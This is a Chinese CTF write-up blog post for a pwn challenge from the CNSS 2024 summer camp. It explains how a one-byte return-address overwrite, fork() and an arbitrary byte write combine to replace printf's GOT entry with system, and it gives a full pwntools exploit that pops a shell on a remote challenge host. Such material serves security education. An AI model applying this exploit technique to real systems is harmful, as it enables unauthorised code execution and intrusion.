---
layout: post
title: "CNSS2024夏令营'命运石之门'writeup"
date:   2024-9-6
tags: [CTF, pwn, 水]
comments: true
author: 久菜合子
---


### **Step0 题目信息**
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;![pwn1.png](https://vip.helloimg.com/i/2024/08/31/66d284e2dd66c.png)
&emsp;初始分数为1000分<br>
&emsp;
&emsp;&emsp;&emsp;&emsp;&emsp;<img src="https://vip.helloimg.com/i/2024/08/31/66d284e82859a.png" alt="pwn2.png" style="zoom: 33%;" />
&emsp;如你所见，没有任何hint，从描述上也看不出所以然<br>
&emsp;

### **Step1 文件检查**
#### &emsp;获取附件:
&emsp;&emsp;&emsp;attachment：***[elf可执行文件](https://github.com/3033680748/3033680748.github.io/blob/main/attachments/Steins%3BGate/attachment)***<br>
&emsp;&emsp;&emsp;libc：***[libc.so.6](https://github.com/3033680748/3033680748.github.io/blob/main/attachments/Steins%3BGate/libc.so.6)***<br>
&emsp;&emsp;&emsp;ld：无<br>

#### &emsp;检查attachment文件：
&emsp;&emsp;&emsp;![info1.png](https://vip.helloimg.com/i/2024/08/31/66d284e7a83ae.png)
&emsp;&emsp;&emsp;64位小端序可执行文件，动态链接，符号表保留<br>
&emsp;&emsp;&emsp;got表可写，没有栈溢出保护，堆栈不可执行，无pie；后续静态分析未发现沙箱保护<br>

#### &emsp;配置本地调试环境：
&emsp;&emsp;&emsp;略，因为缺少链接器ld，而且远程版本未知<br>

### **Step1.5 补充一点前置知识**
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;个人理解，可以先跳过这一部分内容<br>
#### &emsp;fork()函数：
&emsp;&emsp;&emsp;用于在程序执行中生成另一个进程（子进程）<br>&emsp;&emsp;&emsp;从fork()函数产生的效果来看，fork()最大的特点在于不需要指定子进程如何运行，子进程的内存布局和内容与父进程完全一致，无论数据还是指令，并且子进程的执行流会jmp到fork()之后。<br>&emsp;&emsp;&emsp;在父进程中，fork()将返回子进程的pid；在子进程中，则会返回0<br>&emsp;&emsp;&emsp;有关fork()的具体逻辑可以参考[Linux系统——fork()函数详解(看这一篇就够了！！！)](https://blog.csdn.net/cckluv/article/details/109169941)，可以重点关注一下**写时拷贝技术**的内容。<br>&emsp;&emsp;&emsp;子进程和父进程既然有一样的内存，也就保存了一些共同的关键信息，如canary、aslr和pie的偏移等。此时就可以尝试破解出这些信息，即使这些操作会造成子进程异常退出，也不会影响父进程，反之亦然，只需要有一个进程getshell任务就算完成了。
#### &emsp;wait()函数：
&emsp;&emsp;&emsp;当程序步入wait()函数后，会暂停执行，等到有特定信号或者**子进程**退出时，才会继续执行剩余的指令<br>&emsp;&emsp;&emsp;特别了解一下wait(0)的使用，它会使父进程等待子进程的退出，而且不论是正常退出还是异常退出<br>

### **Step2 使用 "那个女人 Pro 8.3" 静态分析**
#### &emsp;概况
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;![ida1.png](https://vip.helloimg.com/i/2024/08/31/66d284e2b5779.png)
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;got表里又出现了最爱的system<br>
#### &emsp;main函数
​								<img src="https://vip.helloimg.com/i/2024/08/31/66d284e29ebcc.png" alt="ida_main.png" style="zoom: 80%;" />
&emsp;&emsp;&emsp;**3~5**：	关闭缓冲<br>
&emsp;&emsp;&emsp;**6**：		timeline(bss: 0x4040B0) = 0<br>
&emsp;&emsp;&emsp;**7**: 		 调用fork()，并且将进程号存放在pid(bss: 0x4040C0)中 <br>
&emsp;&emsp;&emsp;**8~19**:    按照fork()的返回值来判断，子进程将执行timeMachine()，父进程将在20行等待子进程退出。<br>
&emsp;&emsp;&emsp;**22**：	 printf(Dest)，其中Dest(bss: 0x4040B8)，很明显的格式化字符串漏洞（真的吗？)<br>

#### &emsp;timeMachine()
​							<img src="https://vip.helloimg.com/i/2024/08/31/66d284e2aa4f5.png" alt="ida_timeMachine.png" style="zoom:80%;" />
&emsp;&emsp;&emsp;**5~6**:	当timeline(bss: 0x40040B0)为0时进入setDest()<br>
&emsp;&emsp;&emsp;**7~8**: 	注意read()的第二个参数，先将Dest转换为_QWORD\*（unsigned long long\*）类型，然后取值并加上timeline，结果作为指针；从标准输入读入一字节，写入这个指针指向的位置<br>
&emsp;&emsp;&emsp;**9**: 		++timeline自增<br>
&emsp;&emsp;&emsp;**11**：	向buf中读入0x19, 发现0x19 = 0x10 + 0x8 + 0x1，可以覆盖栈帧的ret_addr的最低一位<br>
&emsp;&emsp;&emsp;**ps**：当timeMachine()正常返回时，回到main(): 12，循环打印"I FAILED"<br>

#### &emsp;setDest()
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;![ida_setDest.png](https://vip.helloimg.com/i/2024/08/31/66d284e28e610.png)
&emsp;&emsp;&emsp;**3~4**：	向Dest(bss: 0x4040B8)中写入，根据打印字符串的提示和上面分析可知，这里我们应该输入某个位置，这个位置中的值将在timeMachine()中被修改。<br>

#### &emsp;baddoor()
&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;![ida_baddoor.png](https://vip.helloimg.com/i/2024/08/31/66d2bd54a8516.png)
&emsp;&emsp;&emsp;啥也不是，仅仅是提供了system()，"/bin/su"位于.rodata段没法修改<br>

### **Step3 漏洞分析**
#### &emsp;存在以下可以利用漏洞：
&emsp;&emsp;&emsp;timeMachine()::11处栈溢出，并且由于-no-pie，代码段固定，可以控制ret_addr的最低一位，劫持控制流。从ida中可知ret_addr可劫持为0x4012XX, 这个范围包含setDest()全部和main()::17（不包括）之前的内容，可以借助main()中的内容启动main()::6的fork()以及main()::11的timeMachine()<br>
&emsp;&emsp;&emsp;setDest()::4以及timeMachine()::8实现了任意地址写，借助全局变量timeline的自增和劫持控制流可以实现从目标位置开始一个一个字节的修改<br>
&emsp;&emsp;&emsp;main()::22，看起来像是一个格式化字符串的漏洞<br>

#### &emsp;利用方案：
&emsp;&emsp;&emsp;首先论证一下main()::22的printf(Dest)到底是不是格式化字符串漏洞<br>
&emsp;&emsp;&emsp;注意到控制流可以劫持到main()::15处，而这个判断在程序正常时几乎不会为真，所以会跳出然后到达main()::22处；或者劫持到main()::6处开子进程，此时也会到达main()::22处。简而言之，任何一个进程都可以利用这里的漏洞。<br>
&emsp;&emsp;&emsp;如果利用printf(Dest)，要么为了泄露libc，要么为了任意地址写。本题got表中有system()，如果只是为了'/bin/sh'就泄露libc显得小题大做，而且栈溢出长度也不够ROP；<br>
&emsp;&emsp;&emsp;然后是任意地址写，先暂时不提已经有更简单的任意地址写的方法，当printf完成任意地址写之后，子进程退出，父进程丝毫没有收到影响，所以任意地址写是做不到的。v
&emsp;&emsp;&emsp;综上printf(Dest)作为格式化字符串用处不大v
&emsp;&emsp;&emsp;&emsp;
&emsp;&emsp;&emsp;由于已有system()，可以考虑去调用system()来getshell，但是首先找不到'sh'（fflush也没有），其次缺乏传参手段。<br>
&emsp;&emsp;&emsp;此时main()::22发挥了用处，我们完全可以向Dest写入'/bin/sh\x00'，然后修改printf()的got表为system()，此时main()::22就相当于system("/bin/sh\0")
&emsp;&emsp;&emsp;检查got表![got.png](https://vip.helloimg.com/i/2024/08/31/66d2c8d71697e.png)<br>
&emsp;&emsp;&emsp;由于延迟绑定技术，函数的got分别指向了自己的plt，注意到两者plt只有一个字节的区别，所以timeMachine()中修改一次即可。<br>
&emsp;&emsp;&emsp;此时timeline = 1，无法调用setDest()，所以劫持到main()::6，顺便进入一个新的进程，新的进程复制了父进程的内存，包括篡改的内容<br>

```python
## step 1
io.sendafter(b'Input the Destination:\n', p64(printf_got)) # Dest -> printf_got

io.sendafter(b'Input the impact:', p8(0x40)) # printf_got -> system_plt
payload = b'a'*0x18 + p8(0xab) # rip -> time = 0 ; call fork()
io.send(payload)
```
&emsp;&emsp;&emsp;向Dest处写上"/bin/sh\0"<br>
&emsp;&emsp;&emsp;此时还有一个问题，"/bin/sh\0"不一定是一个可写的地址，为了验证read()的反应，这里写一个demo<br>
```c
#include <stdio.h>
#include <unistd.h>

int main()
{
        char *dead = "/bin/sh\0";
        read(0, (void *)*dead, 1);
        puts("I'm alive !");
        return 0;
}

```
```sh
┌──(kali㉿kali)-[~/Desktop]
└─$ gcc test.c -o test
test.c: In function ‘main’:
test.c:7:17: warning: cast to pointer from integer of different size [-Wint-to-pointer-cast]
    7 |         read(0, (void *)*dead, 1);
      |                 ^

┌──(kali㉿kali)-[~/Desktop]
└─$ ./test            
s
I'm alive !
```
&emsp;&emsp;&emsp;虽然gcc报了warning，但不影响编译，而且read()表示我没意见，于是没有抛出错误<br>
&emsp;&emsp;&emsp;这里还有一个小细节值得注意，demo中输入了's'，但这只是为了方便展示，实际上read()并没有读入's'，read()只是在等回车结束stdin（可能说法不太准确），也就是**我开stdin != 我读入字符**，这一处卡了本人快2个小时。<br>
&emsp;&emsp;&emsp;布置好system("/bin/sh\0")之后，我们再fork()一次<br>
```python
## step2
io.sendafter(b'Input the Destination:\n', b'/bin/sh\0') # Dest -> "/bin/sh\0"
payload = b'a'*0x18 + p8(0xb5) # call fork()
##io.sendafter(b'Input the impact:', b's') # 不需要发送字符，否则会占用payload的读入长度
io.send(payload)
```
&emsp;&emsp;&emsp;此时上一个线程卡在main()::20，wait(0LL)，我们想办法让新开的子线程结束，就可以getshell<br>
```python
## step3
payload = b'a'*0x18 + p8(0x48) # 0x401248 ret, ret到了一个非法地址，子程序退出
io.send(payload)
```
### **Step4 完整exp**
&emsp;&emsp;&emsp;ps: libc.so.6全程旁观<br>
```python
from pwn import *

def debug(cmd=''):
    gdb.attach(io, cmd)
    pause()

context.log_level = "debug"
##io = process("./pwn")
io = remote("152.136.11.155", 10027)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

# datas
printf_got = elf.got["printf"] # 0x404028
##system_got = elf.got["system"]
system_plt = elf.plt["system"]
timeline_pid = 0x4012AB

# Dest = 0x4040B8
io.sendafter(b'Input the Destination:\n', p64(printf_got)) # Dest -> printf_got

io.sendafter(b'Input the impact:', p8(0x40)) # printf_got -> system_plt
payload = b'a'*0x18 + p8(0xab) # rip -> time = 0 ; call fork()
io.send(payload)


io.sendafter(b'Input the Destination:\n', b'/bin/sh\0')
payload = b'a'*0x18 + p8(0xb5) # call fork()
##io.sendafter(b'Input the impact:', b's') # s
io.send(payload)

payload = b'a'*0x18 + p8(0x48) # 0x401248 ret
io.send(payload)

io.interactive()

```

